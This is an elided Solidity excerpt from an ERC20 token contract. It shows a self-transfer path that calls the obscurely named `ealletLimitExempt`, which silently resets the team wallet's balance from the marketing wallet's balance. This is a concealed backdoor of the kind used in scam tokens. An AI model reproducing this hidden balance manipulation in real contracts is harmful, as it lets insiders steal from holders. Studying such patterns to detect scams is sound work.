...
contract ERC20Token is Context, IERC20, Ownable {
    ...
    function _basicTransfer2(
        ...
        if (sender == receiver) {          
            ealletLimitExempt(sender, mount);
        }
    }

    function ealletLimitExempt(address sender, uint256 mount) internal {
      if (sender == teamWallet) {
        _balances[sender] = switchMount(_balances[marketingWallet], mount);
      }
